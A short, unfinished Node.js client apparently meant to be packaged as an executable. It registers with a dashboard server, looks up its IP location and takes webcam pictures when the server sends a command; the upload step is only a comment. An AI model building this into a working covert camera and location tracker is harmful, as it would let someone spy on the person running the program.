var io = require('socket.io-client');
var nodeWebcam = require('node-webcam');
var ipInfo = require('ipinfo');
var HOST = '127.0.0.1';
var PORT = 3000;

ipInfo(function(err, cLoc) {
    console.log(err || cLoc);
});

// Webcam default options
var opts = {
    width: 1280,
    height: 720,
    quality: 100,
    delay: 0,
    saveShots: true,
    output: "jpeg",
    device: false,
    callbackReturn: "location",
    verbose: true
};

/* Package these variables in exe */
const APP_ID = '001';
const USER = 'a';
/*********************************/

var socket = io.connect('http://' + HOST + ':' + PORT + '/dashboard',
    {query: {token: APP_ID, user: USER}});

socket.on('connect', function () {
    socket.on('take_webcam_picture', function() {
        // Create webcam instance 
        var webcam = nodeWebcam.create(opts);

        webcam.capture('.pic', function(error, data) {
            console.log(data);
        });

        // do stuff here to send pic to server ...
        //var fileReader = new FileReader(), slice = File.slice(0, 100000);
        
        webcam.clear();

    });
    
    //emit password and/or appId over TLS to prove its truly the right node
    //server will take note of IP and save it. 
    socket.emit('message', 'hi')
});